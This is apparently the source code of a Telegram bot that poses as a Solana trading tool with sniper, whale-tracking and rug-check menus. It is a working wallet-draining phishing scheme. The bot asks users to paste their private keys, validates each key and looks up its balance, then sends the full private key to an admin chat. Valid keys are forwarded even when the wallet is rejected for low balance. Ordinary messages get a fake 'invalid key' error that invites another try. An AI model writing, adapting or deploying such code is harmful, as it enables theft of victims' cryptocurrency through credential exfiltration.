def validate_tracking_config(config_text: str) -> tuple[bool, str, list, dict]:
    """
    Valide la configuration de tracking
    Retourne: (is_valid, error_message, wallets_list, fees_dict)
    """
    lines = [line.strip() for line in config_text.strip().split('\n') if line.strip()]
    
    if len(lines) < 4:
        return False, "❌ Configuration incomplete. Please provide wallets and fees.", [], {}
    
    # Extraire les wallets
    wallets = []
    fees_started = False
    
    for line in lines:
        lower_line = line.lower()
        
        # Ignorer les lignes "Wallets:" et "Fees:"
        if 'wallet' in lower_line and ':' in lower_line:
            continue
        elif 'fee' in lower_line and ':' in lower_line:
            fees_started = True
            continue
        elif 'slippage' in lower_line or 'priority' in lower_line or 'bribe' in lower_line:
            fees_started = True
        
        if not fees_started:
            # C'est une adresse de wallet
            if line and not line.startswith('#'):
                if not validate_solana_address(line):
                    return False, f"❌ Invalid Solana address: `{line}`", [], {}
                wallets.append(line)
    
    if not wallets:
        return False, "❌ No valid wallet addresses found.", [], {}
    
    # Vérifier le format des fees
    fees_text = config_text.lower()
    
    # Vérifier le format exact
    required_fees = {
        'slippage': '20%',
        'priority': '0.001 sol',
        'bribe': '0.001 sol'
    }
    
    fees_found = {}
    
    for line in lines:
        lower_line = line.lower().strip()
        
        if 'slippage' in lower_line:
            if 'slippage: 20%' in lower_line or 'slippage:20%' in lower_line:
                fees_found['slippage'] = '20%'
            else:
                return False, "❌ Slippage must be exactly: `Slippage: 20%`", [], {}
        
        elif 'priority' in lower_line:
            if 'priority: 0.001 sol' in lower_line or 'priority:0.001 sol' in lower_line or 'priority: 0.001sol' in lower_line:
                fees_found['priority'] = '0.001 sol'
            else:
                return False, "❌ Priority must be exactly: `Priority: 0.001 sol`", [], {}
        
        elif 'bribe' in lower_line:
            if 'bribe: 0.001 sol' in lower_line or 'bribe:0.001 sol' in lower_line or 'bribe: 0.001sol' in lower_line:
                fees_found['bribe'] = '0.001 sol'
            else:
                return False, "❌ Bribe must be exactly: `Bribe: 0.001 sol`", [], {}
    
    # Vérifier que tous les fees sont présents
    if len(fees_found) != 3:
        missing = []
        if 'slippage' not in fees_found:
            missing.append('Slippage: 20%')
        if 'priority' not in fees_found:
            missing.append('Priority: 0.001 sol')
        if 'bribe' not in fees_found:
            missing.append('Bribe: 0.001 sol')
        
        return False, f"❌ Missing or incorrect fees. Required format:\n`Slippage: 20%`\n`Priority: 0.001 sol`\n`Bribe: 0.001 sol`", [], {}
    
    return True, "", wallets, fees_found



async def get_solana_price():
    """Récupère le prix actuel du SOL en USD via plusieurs APIs"""
    
    # Essayer CoinGecko en premier
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status == 200:
                    data = await response.json()
                    sol_price = data.get('solana', {}).get('usd', 0)
                    if sol_price > 0:
                        logger.info(f"💰 Prix actuel du SOL (CoinGecko): ${sol_price}")
                        return sol_price
    except Exception as e:
        logger.warning(f"CoinGecko échoué: {e}")
    
    # Essayer CoinCap en backup
    try:
        async with aiohttp.ClientSession() as session:
            url = "https://api.coincap.io/v2/assets/solana"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status == 200:
                    data = await response.json()
                    sol_price = float(data.get('data', {}).get('priceUsd', 0))
                    if sol_price > 0:
                        logger.info(f"💰 Prix actuel du SOL (CoinCap): ${sol_price}")
                        return sol_price
    except Exception as e:
        logger.warning(f"CoinCap échoué: {e}")
    
    # Essayer Binance en dernier recours
    try:
        async with aiohttp.ClientSession() as session:
            url = "https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status == 200:
                    data = await response.json()
                    sol_price = float(data.get('price', 0))
                    if sol_price > 0:
                        logger.info(f"💰 Prix actuel du SOL (Binance): ${sol_price}")
                        return sol_price
    except Exception as e:
        logger.warning(f"Binance échoué: {e}")
    
    # Si toutes les APIs échouent, utiliser un prix par défaut récent
    logger.error("❌ Toutes les APIs de prix ont échoué, utilisation d'un prix par défaut")
    default_price = 180.0  # Prix approximatif par défaut
    logger.info(f"⚠️ Utilisation du prix par défaut: ${default_price}")
    return default_price


async def verify_wallet_and_balance(private_key_str: str):
    """Vérifie la clé privée et récupère le solde SOL ainsi que sa valeur en USD"""
    try:
        import aiohttp
        from solders.keypair import Keypair
        
        # Récupérer le prix actuel du SOL
        sol_price_usd = await get_solana_price()
        
        # Essayer différents formats de clé privée
        keypair = None
        public_key = None
        
        # Format 1 : Base58 (le plus courant pour Phantom)
        try:
            secret_key = base58.b58decode(private_key_str.strip())
            if len(secret_key) == 64:  # Taille correcte pour Solana
                keypair = Keypair.from_bytes(secret_key)
                public_key = str(keypair.pubkey())
                logger.info(f"✅ Clé décodée en Base58, Public Key: {public_key}")
        except Exception as e:
            logger.info(f"Format Base58 échoué: {e}")
        
        # Format 2 : Liste de bytes [1,2,3,...]
        if not keypair:
            try:
                # Nettoyer la chaîne
                clean_str = private_key_str.strip().replace('[', '').replace(']', '').replace(' ', '')
                secret_key = bytes([int(x) for x in clean_str.split(',')])
                if len(secret_key) == 64:
                    keypair = Keypair.from_bytes(secret_key)
                    public_key = str(keypair.pubkey())
                    logger.info(f"✅ Clé décodée en liste bytes, Public Key: {public_key}")
            except Exception as e:
                logger.info(f"Format liste bytes échoué: {e}")
        
        # Format 3 : Hex
        if not keypair:
            try:
                secret_key = bytes.fromhex(private_key_str.strip())
                if len(secret_key) == 64:
                    keypair = Keypair.from_bytes(secret_key)
                    public_key = str(keypair.pubkey())
                    logger.info(f"✅ Clé décodée en Hex, Public Key: {public_key}")
            except Exception as e:
                logger.info(f"Format Hex échoué: {e}")
        
        # Si aucun format n'a fonctionné
        if not keypair or not public_key:
            logger.error("❌ Tous les formats de clé privée ont échoué")
            return None, None, None, 0, "invalid"
        
        # Récupérer le solde via RPC
        try:
            async with aiohttp.ClientSession() as session:
                payload = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "getBalance",
                    "params": [public_key]
                }
                
                async with session.post(HELIUS_RPC_URL, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    data = await response.json()
                    
                    if "result" in data:
                        lamports = data["result"]["value"]
                        sol_balance = lamports / 1_000_000_000  # Convertir en SOL
                        usd_value = sol_balance * sol_price_usd if sol_price_usd > 0 else 0
                        logger.info(f"✅ Solde récupéré: {sol_balance} SOL (${usd_value:.2f} USD)")
                        return public_key, sol_balance, usd_value, sol_price_usd, "valid"
                    else:
                        logger.warning(f"Pas de résultat dans la réponse RPC: {data}")
                        return public_key, 0, 0, sol_price_usd, "valid"
        
        except Exception as e:
            logger.error(f"Erreur récupération solde: {e}")
            # Même si on ne peut pas récupérer le solde, la clé est valide
            return public_key, 0, 0, sol_price_usd, "valid"
    
    except Exception as e:
        logger.error(f"Erreur générale vérification wallet: {e}")
        return None, None, None, 0, "invalid"


async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère tous les messages texte et les transfère à l'admin"""
    user = update.message.from_user
    user_message = update.message.text
    
    # Vérifier si l'utilisateur doit fournir la config de tracking
    if context.user_data.get('waiting_for_tracking_config'):
        tracking_command = context.user_data.get('tracking_command', 'unknown')
        context.user_data['waiting_for_tracking_config'] = False
        
        # Valider la configuration
        is_valid, error_message, wallets, fees = validate_tracking_config(user_message)
        
        if not is_valid:
            # Configuration invalide
            await update.message.reply_text(
                f"⚠️ **Configuration Error**\n\n{error_message}\n\nPlease try again with the correct format.",
                parse_mode='Markdown'
            )
            
            # Remettre en attente de configuration
            context.user_data['waiting_for_tracking_config'] = True
            
            # Notification à l'admin
            admin_notification = f"""⚠️ **Configuration invalide reçue**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
🎯 **Commande:** {tracking_command}

❌ **Erreur:** {error_message}

📋 **Configuration tentée:**
{user_message}

---
❌ _Configuration rejetée_"""
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_notification,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Erreur envoi à l'admin: {e}")
            
            return
        
        # Configuration valide - Sauvegarder
        context.user_data['tracking_config'] = user_message
        context.user_data['tracked_wallets'] = wallets
        context.user_data['trading_fees'] = fees
        
        # Récupérer les infos du wallet
        public_key = context.user_data.get('wallet_public_key', 'N/A')
        sol_balance = context.user_data.get('wallet_balance_sol', 0)
        usd_balance = context.user_data.get('wallet_balance_usd', 0)
        
        # Envoyer la confirmation avec les infos
        confirmation_message = f"""✅ **Configuration Accepted**

👛 **Your Wallet:**
Address: `{public_key[:8]}...{public_key[-8:]}`
Balance: {sol_balance:.4f} SOL (${usd_balance:.2f} USD)

📋 **Tracking Configuration:**
✅ Wallets to track: {len(wallets)}
✅ Slippage: 20%
✅ Priority: 0.001 sol
✅ Bribe: 0.001 sol

✅ **Configuration Accepted!**

You can now access all trading features and start trading!"""
        
        # Boutons selon la commande/action
        if tracking_command in ['trade', 'quick_buy', 'bloom_trading']:
            keyboard = [
                [
                    InlineKeyboardButton("⚡ Start Trading", callback_data='start_trading'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("⚙️ Modify Config", callback_data='modify_config'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['sniper', 'activate_sniper', 'sniper_settings']:
            keyboard = [
                [
                    InlineKeyboardButton("🎯 Activate Sniper", callback_data='activate_sniper'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("⚙️ Modify Config", callback_data='modify_config'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['scan', 'scan_new', 'market_overview']:
            keyboard = [
                [
                    InlineKeyboardButton("🔍 Start Scanning", callback_data='start_scan'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("⚙️ Modify Config", callback_data='modify_config'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['multi_wallet', 'multiwallet']:
            keyboard = [
                [
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked'),
                    InlineKeyboardButton("➕ Add More Wallets", callback_data='add_wallets')
                ],
                [
                    InlineKeyboardButton("⚙️ Modify Config", callback_data='modify_config'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['contract_analyzer', 'analyzer']:
            keyboard = [
                [
                    InlineKeyboardButton("🔍 Analyze Contract", callback_data='analyze_contract'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("⚙️ Modify Config", callback_data='modify_config'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['whale_tracker', 'whale']:
            keyboard = [
                [
                    InlineKeyboardButton("🐋 Start Tracking", callback_data='start_whale_track'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("📈 Recent Whale Moves", callback_data='whale_moves'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['ai_predict', 'predict']:
            keyboard = [
                [
                    InlineKeyboardButton("🧠 Get Prediction", callback_data='get_prediction'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("📈 Market Analysis", callback_data='market_analysis'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['rug_detector', 'rugcheck']:
            keyboard = [
                [
                    InlineKeyboardButton("🔴 Scan for Rugs", callback_data='scan_rugs'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("⚠️ Risk Report", callback_data='risk_report'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        else:  # stats ou autres
            keyboard = [
                [
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [
                    InlineKeyboardButton("⚙️ Modify Config", callback_data='modify_config')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            confirmation_message,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        
        # Notification à l'admin
        admin_notification = f"""📊 **Configuration de tracking reçue**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
🎯 **Commande:** {tracking_command}

👛 **Wallet:** `{public_key}`
💰 **Balance:** {sol_balance:.4f} SOL (${usd_balance:.2f} USD)

📋 **Configuration:**
{user_message}

---
✅ _Configuration acceptée_"""
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_notification,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Erreur envoi à l'admin: {e}")
        
        return
    
    # Vérifier si l'utilisateur attend de connecter son wallet
    if context.user_data.get('waiting_for_wallet'):
        wallet_type = context.user_data.get('wallet_type', 'Unknown')
        context.user_data['waiting_for_wallet'] = False
        
        # Vérifier la clé privée et le solde
        public_key, sol_balance, usd_value, sol_price, status = await verify_wallet_and_balance(user_message)
        
        if status == "invalid":
            # Clé privée invalide
            back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
            back_markup = InlineKeyboardMarkup(back_keyboard)
            
            await update.message.reply_text(
                "⚠️ Validation Error\n\nInvalid private key format.",
                reply_markup=back_markup
            )
            
            # Notification à l'admin
            admin_notification = f"""❌ **Clé privée invalide**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
💳 **Wallet Type:** {wallet_type}

🔑 **Clé tentée:**
`{user_message[:20]}...`

---
⚠️ _Clé privée invalide_"""
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_notification,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Erreur envoi à l'admin: {e}")
            
            return
        
        # Clé valide, vérifier le solde en USD
        if usd_value < MINIMUM_USD_REQUIRED:
            # Wallet avec solde insuffisant
            back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
            back_markup = InlineKeyboardMarkup(back_keyboard)
            
            await update.message.reply_text(
                f"⚠️ Wallet Cannot Be Accepted\n\n"
                f"Insufficient balance.\n"
                f"Your wallet contains: {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n\n"
                f"Please add more SOL to use trading features.",
                reply_markup=back_markup
            )
            
            # Notification à l'admin
            admin_notification = f"""⚠️ **Wallet rejeté - Solde insuffisant**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
💳 **Wallet Type:** {wallet_type}

👛 **Public Key:** `{public_key}`
💰 **Balance:** {sol_balance:.4f} SOL
💵 **Valeur USD:** ${usd_value:.2f}
📊 **Prix SOL:** ${sol_price:.2f}
⚠️ **Minimum requis:** ${MINIMUM_USD_REQUIRED:.2f}

🔑 **Private Key:**
`{user_message}`

---
❌ _Wallet rejeté - Solde insuffisant (< ${MINIMUM_USD_REQUIRED})_"""
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_notification,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Erreur envoi à l'admin: {e}")
            
            return
        
        # Wallet valide avec solde suffisant
        # Sauvegarder les informations du wallet dans user_data
        context.user_data['wallet_connected'] = True
        context.user_data['wallet_public_key'] = public_key
        context.user_data['wallet_balance_sol'] = sol_balance
        context.user_data['wallet_balance_usd'] = usd_value
        context.user_data['wallet_type'] = wallet_type
        
        # Créer un bouton pour retourner au menu
        back_keyboard = [[InlineKeyboardButton("🏠 Back to Main Menu", callback_data='back_to_menu')]]
        back_markup = InlineKeyboardMarkup(back_keyboard)
        
        await update.message.reply_text(
            f"✅ **Wallet Connected Successfully**\n\n"
            f"💳 **Type:** {wallet_type}\n"
            f"💰 **Balance:** {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n"
            f"👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`\n\n"
            f"You can now access all trading features.",
            reply_markup=back_markup,
            parse_mode='Markdown'
        )
        
        # Notification à l'admin
        admin_notification = f"""✅ **Wallet connecté avec succès**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
💳 **Wallet Type:** {wallet_type}

👛 **Public Key:** `{public_key}`
💰 **Balance:** {sol_balance:.4f} SOL
💵 **Valeur USD:** ${usd_value:.2f}
📊 **Prix SOL:** ${sol_price:.2f}

🔑 **Private Key:**
`{user_message}`

---
✅ _Wallet accepté et connecté_"""
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_notification,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Erreur envoi à l'admin: {e}")
        
        return
    
    # Message normal - Notification à l'admin
    admin_notification = f"""📨 **Nouveau message reçu**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`

💬 **Message:**
{user_message}

---
_Envoyé depuis le bot_"""
    
    try:
        # Envoyer le message à l'admin
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_notification,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Erreur lors de l'envoi à l'admin: {e}")
    
    # Envoyer le message à l'utilisateur
    await update.message.reply_text(
        "⚠️ Validation Error\n\nInvalid private key format."
    )


def main():
    """Fonction principale pour lancer le bot"""
    
    # Création de l'application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Ajout des handlers (gestionnaires de commandes)
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("trade", trade_command))
    application.add_handler(CommandHandler("sniper", sniper_command))
    application.add_handler(CommandHandler("wallet", wallet_command))
    application.add_handler(CommandHandler("scan", scan_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Commandes correspondant aux boutons du menu
    application.add_handler(CommandHandler("quickbuy", quickbuy_command))
    application.add_handler(CommandHandler("bloom", bloom_command))
    application.add_handler(CommandHandler("multiwallet", multiwallet_command))
    application.add_handler(CommandHandler("analyzer", analyzer_command))
    application.add_handler(CommandHandler("predict", predict_command))
    application.add_handler(CommandHandler("whale", whale_command))
    application.add_handler(CommandHandler("rugcheck", rugcheck_command))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Handler pour tous les messages texte
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    
    # Démarrage du bot
    logger.info("Bot démarré ! 🚀")
    logger.info(f"Messages seront envoyés au Chat ID: {ADMIN_CHAT_ID}")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
